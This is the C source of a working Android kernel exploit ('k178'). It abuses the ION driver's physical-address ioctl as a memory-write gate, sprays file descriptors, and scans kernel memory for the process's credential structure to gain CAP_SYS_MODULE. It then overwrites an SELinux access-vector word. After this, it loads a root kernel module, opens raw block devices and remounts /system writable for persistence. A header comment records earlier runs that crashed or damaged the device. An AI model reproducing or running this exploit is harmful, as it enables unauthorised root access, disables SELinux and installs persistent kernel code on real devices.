/* k178: one window per process, chosen at run time.
 *
 * The measurements that shape this design:
 *
 *     k172  full 2 GB, 938 stores before the node   -> panicked 6 s later
 *     k174  0x44000000 up, 45 stores               -> won, broke /system/bin later
 *     k175  0x4e000000..0x50000000, 664 stores     -> no win, DEVICE SURVIVED
 *     k176  full 2 GB                              -> died before writing a byte of log
 *
 * So the size of the scan, not the win itself, is what kills the tablet: 664 stores are
 * survivable, tens of thousands are not. And the node is not in a fixed place - k175's
 * window contained it on the boot where k174 ran and did not on the next one.
 *
 * Therefore the scan is split into windows and each window is a separate process. A window
 * that kills the device costs one window and a reboot; the damage does not persist across
 * a reboot, which the last recovery proved (toolbox ran again immediately afterwards).
 *
 * The tests are ordered so that the ones which must fail come first, because a failed probe
 * writes nothing:
 *
 *     gate(n+0) != 0     ssid is 0 or one of our fds   -> reject, nothing written
 *     gate(n+4) != 0     tsid likewise                -> reject, nothing written
 *     gate(n+8) == 0     the word is 4, so it stores at n+12 (avd.allowed)
 *
 * With only fd 4 holding a dma-buf, a zero word fails the gate, so the first two tests
 * reject both zeroes and non-matching values at no cost. Only a genuine 4 costs a write.
 *
 * Usage: k178 <lo> <hi>   both hexadecimal, e.g. k178 4e000000 50000000
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/mount.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_handle_data { s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };

#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_FREE   _IOWR(ION_TYPE, 1, struct ion_handle_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)

struct cap_hdr { u32 version; int pid; };
struct cap_data { u32 eff, prm, inh; };

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART 0x01000000ULL
#define PGSZ 4096
#define BASE_FD 2000
#define NALPHA 17
#define ION_SLOT 3000
#define CLASS_FD 4
#define NSLOT 21
#define OBJSZ 192
#define MAXCAND 4096
#define CAP_SYS_MODULE_BIT 16

static FILE *LOG;
static int ionfd;
static void say(const char *fmt, ...){
    char b[300]; va_list ap; va_start(ap, fmt);
    vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int gate(u64 a){
    struct ion_custom_data cd; cd.cmd = ION_IOC_PHYS; cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}
static int mk_raw(int *h, int *f, u32 *iv){
    struct ion_allocation_data a;
    memset(&a, 0, sizeof a);
    a.len = PGSZ; a.heap_id_mask = 1u << 0; a.flags = ION_FLAG_CACHED;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;
    struct ion_fd_data d; memset(&d, 0, sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;
    *h = a.handle; *f = d.fd;
    if (iv){
        struct ion_phys_data p; memset(&p, 0, sizeof p);
        p.fd = d.fd; p.flags = ION_BUFFER_TYPE_DMA;
        *iv = (ioctl(ionfd, ION_IOC_PHYS, &p) == 0) ? p.addr : 0;
    }
    return 1;
}
static u32 eff_of(int pid){
    struct cap_hdr hh; struct cap_data dd[2];
    memset(&hh, 0, sizeof hh); memset(dd, 0, sizeof dd);
    hh.version = 0x20080522; hh.pid = pid;
    if (syscall(SYS_capget, &hh, dd) < 0) return 0xFFFFFFFFu;
    return dd[0].eff;
}
static int try_module(void){
    static const char j[4] = { 0x7f, 'E', 'L', 'F' };
    errno = 0;
    syscall(105, j, 4UL, "");
    return errno;
}

/* after the win: load, prove, and try to make it durable */
static void finish(void)
{
    int fd = open("/data/local/tmp/myroot.ko", O_RDONLY);
    if (fd < 0){ say("  module missing errno=%d\n", errno); return; }
    char *mod = malloc(1 << 20);
    ssize_t got = read(fd, mod, 1 << 20);
    close(fd);
    errno = 0;
    long rc = syscall(105, mod, (unsigned long)got, "");
    say("  init_module rc=%ld errno=%d (%zd bytes)\n", rc, errno, got);
    if (rc != 0) return;

    say("  uid=%d euid=%d capget=0x%08x\n", getuid(), geteuid(), eff_of(0));
    {
        int p = open("/proc/myroot", O_WRONLY);
        if (p >= 0){ if (write(p, "1", 1) == 1) say("  /proc/myroot accepted a write\n"); close(p); }
        else say("  /proc/myroot errno=%d\n", errno);
    }
    const char *t[] = {"/proc/kmsg", "/dev/block/mmcblk0", "/init.rc", NULL};
    for (int i = 0; t[i]; i++){
        int f = open(t[i], O_RDONLY);
        say("  %-22s %s\n", t[i], f >= 0 ? "OPEN" : strerror(errno));
        if (f >= 0) close(f);
    }
    /* SELinux is off now, so a remount may finally be permitted */
    int r = mount(NULL, "/system", NULL, MS_REMOUNT, NULL);
    say("  remount /system rw: %s\n", r == 0 ? "OK" : strerror(errno));
    if (r == 0){
        int f = open("/system/.k178", O_CREAT|O_WRONLY, 0644);
        say("  write /system/.k178: %s\n", f >= 0 ? "OK" : strerror(errno));
        if (f >= 0) close(f);
    }
    say("  modules: ");
    { int f = open("/proc/modules", O_RDONLY);
      if (f >= 0){ char b[2048]; ssize_t n = read(f, b, sizeof b - 1);
        if (n > 0){ b[n] = 0; say("%s\n", strstr(b, "myroot") ? "myroot present" : "myroot ABSENT"); }
        close(f); } }
}

int main(int argc, char **argv)
{
    u32 lo = 0x4e000000u, hi = 0x50000000u;
    if (argc >= 3){
        lo = (u32)strtoul(argv[1], NULL, 16);
        hi = (u32)strtoul(argv[2], NULL, 16);
    }
    LOG = fopen("/data/local/tmp/k178.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    say("k178 pid=%d uid=%d window 0x%08x..0x%08x\n", getpid(), getuid(), lo, hi);

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0){
        rl.rlim_cur = rl.rlim_max; setrlimit(RLIMIT_NOFILE, &rl);
    }
    int raw = open("/dev/ion", O_RDWR);
    if (raw < 0){ say("open errno=%d\n", errno); return 0; }
    ionfd = fcntl(raw, F_DUPFD, ION_SLOT);
    if (ionfd < 0) ionfd = raw; else close(raw);

    static int pad[4096]; int npp = 0;
    while (npp < 4090){
        int fd = open("/dev/null", O_RDONLY);
        if (fd < 0) break;
        pad[npp++] = fd;
        if (fd >= BASE_FD - 1) break;
    }
    if (!npp || pad[npp-1] != BASE_FD - 1){ say("pad stopped at %d\n", npp?pad[npp-1]:-1); return 0; }

    static int ah[NALPHA], af[NALPHA]; static u32 aiv[NALPHA]; int na = 0;
    for (int i = 0; i < NALPHA; i++){
        int h, f; u32 iv = 0;
        if (!mk_raw(&h, &f, &iv)) break;
        ah[na] = h; af[na] = f; aiv[na] = iv; na++;
    }
    if (na < NALPHA){ say("alphabet short %d\n", na); return 0; }
    int i16 = -1;
    for (int i = 0; i < na; i++) if ((aiv[i] >> CAP_SYS_MODULE_BIT) & 1){ i16 = i; break; }
    say("17 buffers fd %d..%d, bit16 index=%d iova=0x%08x\n",
        af[0], af[na-1], i16, i16 >= 0 ? aiv[i16] : 0);
    if (i16 < 0) return 0;

    int keep = dup(af[i16]);
    if (keep < 0){ say("dup errno=%d\n", errno); return 0; }
    for (int i = 0; i < NALPHA; i++)
        if (dup2(af[i], BASE_FD + i) < 0){ say("dup2 %d failed\n", i); return 0; }

    /* phase A: cap_effective bit 16, one probe per slot over the whole range */
    int nul = open("/dev/null", O_RDONLY);
    if (nul >= 0) dup2(nul, 0);
    static u64 cand[MAXCAND]; int nc = 0;
    for (u32 p = 0x02000000u; p < 0x7f000000u && nc < MAXCAND; p += PGSZ){
        u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
        for (int i = 0; i < NSLOT && nc < MAXCAND; i++){
            u64 o = pg + (u64)i * OBJSZ;
            if ((size_t)i * OBJSZ + 132 > PGSZ) break;
            if (gate(o + 4) != 0) continue;
            cand[nc++] = o;
        }
    }
    say("phase A: uid candidates=%d\n", nc);
    u64 mycred = 0;
    if (nc && dup2(keep, 0) >= 0){
        for (int i = 0; i < nc && !mycred; i++){
            u64 o = cand[i];
            if (gate(o + 52) != 0) continue;
            u32 e = eff_of(0);
            if (e != 0xFFFFFFFFu && (e & (1u << CAP_SYS_MODULE_BIT))){
                mycred = o;
                say("  cred 0x%llx eff=0x%08x\n", (unsigned long long)o, e);
            }
        }
    }
    say("  cred=0x%llx errno=%d\n", (unsigned long long)mycred, try_module());
    if (!mycred) return 0;

    /* narrow: fd 4 is the only dmabuf and it carries 0x80010000 */
    for (int i = 0; i < NALPHA; i++) close(BASE_FD + i);
    for (int i = 0; i < na; i++) if (af[i] != keep) close(af[i]);
    if (dup2(keep, CLASS_FD) < 0){ say("dup2 errno=%d\n", errno); return 0; }
    close(keep);
    if (dup2(CLASS_FD, 0) >= 0 && gate(mycred + 52) != 0)
        say("  warning: re-grant failed\n");
    { int n2 = open("/dev/null", O_RDONLY); if (n2 >= 0 && n2 != 0) dup2(n2, 0); }
    say("narrowed; PASS means word==%d; baseline errno=%d\n", CLASS_FD, try_module());

    /* phase B: the window */
    say("phase B: 0x%08x..0x%08x\n", lo, hi);
    long stores = 0, pages = 0; int win = 0; u32 winphys = 0;
    for (u32 p = lo; p < hi && !win; p += PGSZ){
        pages++;
        u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
        for (int i = 0; i < PGSZ / 64; i++){
            u64 n = pg + (u64)i * 64;
            /* One probe. A miss writes nothing (dma_buf_get fails before the store),
             * and a hit writes n+12, which is avd.allowed. Extra pre-filters would
             * have to use the same gate, and any of them that succeeds also writes. */
            if (gate(n + 8) != 0) continue;
            stores++;
            if (try_module() == 8){
                win = 1; winphys = p;
                say("  WIN phys 0x%08x off %d after %ld stores\n", p, i * 64, stores);
                break;
            }
        }
        if ((pages & 0x7ff) == 0)
            say("  phys 0x%08x pages=%ld stores=%ld\n", p, pages, stores);
    }
    say("RESULT pages=%ld stores=%ld win=%d phys=0x%08x\n",
        pages, stores, win, winphys);
    if (!win){ say("no win in this window\n"); say("K178 done\n"); return 0; }

    /* phase C, immediately */
    finish();
    say("K178 done\n");
    return 0;
}
